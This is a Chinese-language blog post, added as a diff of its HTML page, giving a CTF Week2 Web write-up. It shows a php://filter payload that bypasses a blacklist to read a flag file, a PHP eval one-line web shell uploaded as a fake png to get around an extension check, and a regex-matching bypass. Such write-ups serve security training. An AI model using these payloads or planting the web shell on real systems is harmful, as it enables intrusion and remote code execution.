@@ -1,0 +1,958 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/mimi.jpg">
+  <link rel="icon" href="/img/mimi.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Goocean5263">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Week2-Web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="QuestionCTF-Week2-wp">
+<meta property="og:url" content="https://goocean5263.github.io/2025/11/02/QuestionCTF-Week2-wp/index.html">
+<meta property="og:site_name" content="Gone with the Wind">
+<meta property="og:description" content="Week2-Web">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://goocean5263.github.io/images/QuestionCTF-Week2-wp/image-20251015181408497.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/QuestionCTF-Week2-wp/image-20251015181559161.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/QuestionCTF-Week2-wp/image-20251015181834644.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/QuestionCTF-Week2-wp/image-20251015181917963.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/QuestionCTF-Week2-wp/image-20251015182114253.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/QuestionCTF-Week2-wp/image-20251015192820937.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/QuestionCTF-Week2-wp/image-20251015192809141.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/QuestionCTF-Week2-wp/image-20251015193120896.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/QuestionCTF-Week2-wp/image-20251015193229196.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/QuestionCTF-Week2-wp/image-20251015193256457.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/QuestionCTF-Week2-wp/image-20251015212225870.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/QuestionCTF-Week2-wp/image-20251015213552321.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/QuestionCTF-Week2-wp/image-20251015231136040.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/QuestionCTF-Week2-wp/image-20251015231225204.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/QuestionCTF-Week2-wp/image-20251015231301828.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/QuestionCTF-Week2-wp/image-20251015231507656.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/QuestionCTF-Week2-wp/image-20251015231522803.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/QuestionCTF-Week2-wp/image-20251015232022890.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/QuestionCTF-Week2-wp/image-20251016165139101.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/QuestionCTF-Week2-wp/image-20251016165202122.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/QuestionCTF-Week2-wp/image-20251016165302756.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/QuestionCTF-Week2-wp/image-20251016165328741.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/QuestionCTF-Week2-wp/image-20251016165437190.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/QuestionCTF-Week2-wp/image-20251016165503026.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/QuestionCTF-Week2-wp/image-20251016165538355.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/QuestionCTF-Week2-wp/image-20251016165628320.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/QuestionCTF-Week2-wp/image-20251016165704451.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/QuestionCTF-Week2-wp/image-20251016170038784.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/QuestionCTF-Week2-wp/image-20251016171626747.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/QuestionCTF-Week2-wp/image-20251016171713498.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/QuestionCTF-Week2-wp/image-20251016171747245.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/QuestionCTF-Week2-wp/image-20251016172127762.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/QuestionCTF-Week2-wp/image-20251016174600807.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/QuestionCTF-Week2-wp/image-20251016174618654.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/QuestionCTF-Week2-wp/image-20251016174729936.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/QuestionCTF-Week2-wp/image-20251016175211949.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/QuestionCTF-Week2-wp/image-20251016223201573.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/QuestionCTF-Week2-wp/image-20251016223242537.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/QuestionCTF-Week2-wp/image-20251016223353836.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/QuestionCTF-Week2-wp/image-20251016223436956.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/QuestionCTF-Week2-wp/image-20251016223651102.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/QuestionCTF-Week2-wp/image-20251101224602041.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/QuestionCTF-Week2-wp/image-20251101224634318.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/QuestionCTF-Week2-wp/image-20251101224700854.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/QuestionCTF-Week2-wp/image-20251101224723024.png">
+<meta property="article:published_time" content="2025-11-02T07:28:01.000Z">
+<meta property="article:modified_time" content="2026-03-09T08:16:46.336Z">
+<meta property="article:author" content="Goocean5263">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="wp">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://goocean5263.github.io/images/QuestionCTF-Week2-wp/image-20251015181408497.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>QuestionCTF-Week2-wp - Gone with the Wind</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"goocean5263.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":"b264de23432894f08f407e28d8a46a83","google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+    <!-- Baidu Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?b264de23432894f08f407e28d8a46a83";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Gong with the wind</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="QuestionCTF-Week2-wp"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-11-02 15:28" pubdate>
+          2025年11月2日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          17 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">QuestionCTF-Week2-wp</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Look-at-the-picture"><a href="#Look-at-the-picture" class="headerlink" title="Look at the picture"></a><strong>Look at the picture</strong></h3><p><img src="/images/QuestionCTF-Week2-wp/image-20251015181408497.png" srcset="/img/loading.gif" lazyload alt="image-20251015181408497"></p>
+<p>让我们只能用http协议，不能用其他的？</p>
+<p>我就不，我要试试其他的，发现用<strong>file协议</strong>直接被过滤了</p>
+<p><img src="/images/QuestionCTF-Week2-wp/image-20251015181559161.png" srcset="/img/loading.gif" lazyload alt="image-20251015181559161"></p>
+<p>又试了<strong>php:&#x2F;&#x2F;filter</strong>————伏笔</p>
+<p>payload：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?url=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=flag<br></code></pre></td></tr></table></figure>
+
+<p>发现依旧被过滤</p>
+<p>用御剑目录扫描工具扫出来一个网站备份</p>
+<p><img src="/images/QuestionCTF-Week2-wp/image-20251015181834644.png" srcset="/img/loading.gif" lazyload alt="image-20251015181834644"></p>
+<p>下载解压后得到原php文件</p>
+<p>发现黑名单</p>
+<p><img src="/images/QuestionCTF-Week2-wp/image-20251015181917963.png" srcset="/img/loading.gif" lazyload alt="image-20251015181917963"></p>
+<p>仔细发现，其实并没有过滤<strong>php:&#x2F;&#x2F;filter</strong>，而是把<strong>base64</strong>给过滤了，所以我们直接去掉base64，构造</p>
+<p>payload：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?url=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/resource=/</span>flag<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/QuestionCTF-Week2-wp/image-20251015182114253.png" srcset="/img/loading.gif" lazyload alt="image-20251015182114253"></p>
+<p>得到flag</p>
+<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;y0u_9et_Th3_fiItER&#125;</span><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="Only-Picture-Up——ezupload"><a href="#Only-Picture-Up——ezupload" class="headerlink" title="Only Picture Up——ezupload"></a>Only Picture Up——ezupload</h3><p>可知是考察<strong>文件上传</strong>，主要尝试一句话木马，修改Content-Type和文件后缀</p>
+<p><img src="/images/QuestionCTF-Week2-wp/image-20251015192820937.png" srcset="/img/loading.gif" lazyload alt="image-20251015192820937"></p>
+<p><img src="/images/QuestionCTF-Week2-wp/image-20251015192809141.png" srcset="/img/loading.gif" lazyload alt="image-20251015192809141"></p>
+<p>上传文件内容：POST123.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;123&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>因为只允许jpg、png、gif文件后缀上传，所以我们直接抓包，将POST123.php后缀改为png，Content-Type也改成image&#x2F;png</p>
+<p><img src="/images/QuestionCTF-Week2-wp/image-20251015193120896.png" srcset="/img/loading.gif" lazyload alt="image-20251015193120896"></p>
+<p>上传成功，点击Preview，复制路径，使用蚁剑连接</p>
+<p><img src="/images/QuestionCTF-Week2-wp/image-20251015193229196.png" srcset="/img/loading.gif" lazyload alt="image-20251015193229196"></p>
+<p>根目录下发现flag</p>
+<p><img src="/images/QuestionCTF-Week2-wp/image-20251015193256457.png" srcset="/img/loading.gif" lazyload alt="image-20251015193256457"></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;e8708585-<span class="hljs-number">858</span>d-<span class="hljs-number">4</span>c7b-<span class="hljs-number">836</span>e-c6560a237149&#125;<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="Regular-Expression"><a href="#Regular-Expression" class="headerlink" title="Regular Expression"></a><strong>Regular Expression</strong></h3><p>这题让我对正则有了更深的理解</p>
+<p><img src="/images/QuestionCTF-Week2-wp/image-20251015212225870.png" srcset="/img/loading.gif" lazyload alt="image-20251015212225870"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;?&quot;</span>]))&#123;<br>    <span class="hljs-variable">$_</span>？ = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;?&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^-(ctf|CTF)&lt;\n&gt;&#123;5&#125;[h-l]\d\d\W+@email\.com flag.\b$/&#x27;</span>, <span class="hljs-variable">$_</span>？) &amp;&amp; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$_</span>？) == <span class="hljs-number">40</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Good job! Now I need you to write a regular expression for my string.&lt;/br&gt;&#x27;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;preg&#x27;</span>]))&#123;<br>            <span class="hljs-variable">$preg</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;|&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;preg&#x27;</span>]);<br>            <span class="hljs-variable">$test_string</span> = <span class="hljs-string">&#x27;Please\ 777give+. !me?&lt;=-=&gt;(.*)Flaggg0&#x27;</span>;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$preg</span>.<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-variable">$test_string</span>) &amp;&amp; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;preg&#x27;</span>]) &gt; <span class="hljs-number">77</span>)&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Congratulations! Here is your flag: &quot;</span>.<span class="hljs-variable">$flag</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Almost succeeded!&quot;</span>;<br>            &#125;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Think twice, and go to study!!!&quot;</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome to ?ctf&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><strong>先进行第一段匹配</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;?&quot;</span>]))&#123;<br>    <span class="hljs-variable">$_</span>？ = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;?&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^-(ctf|CTF)&lt;\n&gt;&#123;5&#125;[h-l]\d\d\W+@email\.com flag.\b$/&#x27;</span>, <span class="hljs-variable">$_</span>？) &amp;&amp; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$_</span>？) == <span class="hljs-number">40</span>)<br></code></pre></td></tr></table></figure>
+
+<p>因为变量名是?，所以传入时需要进行一下url编码，为**%3f**</p>
+<p>然后是正则，分解一下</p>
+<ul>
+<li><code>^-</code>：以连字符（<code>-</code>）开头</li>
+<li><code>(ctf|CTF)</code>：匹配”ctf”或”CTF”（3字符）</li>
+<li><code>&lt;\n&gt;</code>：匹配”&lt;” + 换行符 + “&gt;”（3字符）</li>
+<li><code>&gt;{5}</code>：匹配5个”&gt;”字符（&gt;&gt;&gt;&gt;&gt;）</li>
+<li><code>[h-l]</code>：匹配h到l之间的单个字母（如i）</li>
+<li><code>\d\d</code>：匹配两个数字（如12）</li>
+<li><code>\W+</code>：匹配至少一个非单词字符（如!@#$%^&amp;*）</li>
+<li><code>@email\.com</code>：匹配”@email.com”（11字符）</li>
+<li><code> flag.</code>：匹配空格+”flag.”（5字符）——<code>.</code>是匹配单个字符</li>
+<li><code>\b$</code>：单词边界+字符串结束</li>
+</ul>
+<p>根据以上分解一个一个构建字符串：</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs llvm">-<br>-ctf<br>-ctf&lt;<br>-ctf&lt;<span class="hljs-variable">%0</span>A		# <span class="hljs-variable">%0</span>A即是换行<br>-ctf&lt;<span class="hljs-variable">%0</span>A&gt;&gt;&gt;&gt;&gt;<br>-ctf&lt;<span class="hljs-variable">%0</span>A&gt;&gt;&gt;&gt;&gt;i<br>-ctf&lt;<span class="hljs-variable">%0</span>A&gt;&gt;&gt;&gt;&gt;<span class="hljs-type">i1</span><br>-ctf&lt;<span class="hljs-variable">%0</span>A&gt;&gt;&gt;&gt;&gt;<span class="hljs-type">i12</span><br>-ctf&lt;<span class="hljs-variable">%0</span>A&gt;&gt;&gt;&gt;&gt;<span class="hljs-type">i12</span>!!!!!!!!!!			# 因为需要满足字符串长度<span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">40</span>，所以就一直补充!等字符即可<br>-ctf&lt;<span class="hljs-variable">%0</span>A&gt;&gt;&gt;&gt;&gt;<span class="hljs-type">i12</span>!!!!!!!!!!<span class="hljs-title">@email.com</span><br>-ctf&lt;<span class="hljs-variable">%0</span>A&gt;&gt;&gt;&gt;&gt;<span class="hljs-type">i12</span>!!!!!!!!!!<span class="hljs-title">@email.com</span><span class="hljs-variable">%20</span>flag<br>-ctf&lt;<span class="hljs-variable">%0</span>A&gt;&gt;&gt;&gt;&gt;<span class="hljs-type">i12</span>!!!!!!!!!!<span class="hljs-title">@email.com</span><span class="hljs-variable">%20</span>flagX<br></code></pre></td></tr></table></figure>
+
+<p>最终第一阶段参数为：</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?<span class="hljs-variable">%3</span>f<span class="hljs-operator">=</span>-ctf&lt;<span class="hljs-variable">%0</span>A&gt;&gt;&gt;&gt;&gt;<span class="hljs-type">i12</span>!!!!!!!!!!<span class="hljs-title">@email.com</span><span class="hljs-variable">%20</span>flagX<br></code></pre></td></tr></table></figure>
+
+<p><strong>第二阶段匹配</strong>，这个比较简单一点</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$preg</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;|&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;preg&#x27;</span>]);<br>            <span class="hljs-variable">$test_string</span> = <span class="hljs-string">&#x27;Please\ 777give+. !me?&lt;=-=&gt;(.*)Flaggg0&#x27;</span>;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$preg</span>.<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-variable">$test_string</span>) &amp;&amp; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;preg&#x27;</span>]) &gt; <span class="hljs-number">77</span>)&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Congratulations! Here is your flag: &quot;</span>.<span class="hljs-variable">$flag</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Almost succeeded!&quot;</span>;<br>            &#125;<br></code></pre></td></tr></table></figure>
+
+<p><code>preg</code>参数需满足：</p>
+<ol>
+<li>长度大于77</li>
+<li>能匹配测试字符串：<code>Please\ 777give+. !me?&lt;=-=&gt;(.*)Flaggg0</code></li>
+<li>“|”字符会被移除</li>
+</ol>
+<p><strong>解决方案一</strong></p>
+<p>构造一个超长但能匹配任意内容的正则：</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">^.<span class="hljs-strong">*.*</span>.<span class="hljs-strong">*.*</span>.<span class="hljs-strong">*.*</span>.<span class="hljs-strong">*.*</span>.<span class="hljs-strong">*.*</span>.<span class="hljs-strong">*.*</span>.<span class="hljs-strong">*.*</span>.<span class="hljs-strong">*.*</span>.<span class="hljs-strong">*.*</span>.<span class="hljs-strong">*.*</span>.<span class="hljs-strong">*.*</span>.<span class="hljs-strong">*.*</span>.<span class="hljs-strong">*.*</span>.<span class="hljs-strong">*.*</span>.<span class="hljs-strong">*.*</span>.<span class="hljs-strong">*.*</span>.<span class="hljs-strong">*.*</span>.<span class="hljs-strong">*.*</span>.<span class="hljs-strong">*.*</span>.<span class="hljs-strong">*.*</span>.<span class="hljs-strong">*.*</span>.*$<br></code></pre></td></tr></table></figure>
+
+<p>长度可以自由调节，由于<code>.*</code>能匹配任意字符，它必然能匹配测试字符串。</p>
+<p><strong>解决方案二</strong></p>
+<p>因为该题将<code>|</code>进行了替换成空的操作，但在比较长度时用的是未替换的值，所以可以构造：</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">.*<span class="hljs-string">||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||</span><br></code></pre></td></tr></table></figure>
+
+<p>最终结果：</p>
+<p>GET：</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?<span class="hljs-variable">%3</span>F<span class="hljs-operator">=</span>-ctf&lt;<span class="hljs-variable">%0</span>A&gt;&gt;&gt;&gt;&gt;<span class="hljs-type">i12</span>!!!!!!!!!!<span class="hljs-title">@email.com</span><span class="hljs-variable">%20</span>flagX<br></code></pre></td></tr></table></figure>
+
+<p>POST：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">preg</span>=.*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||<br></code></pre></td></tr></table></figure>
+
+<p>得到flag</p>
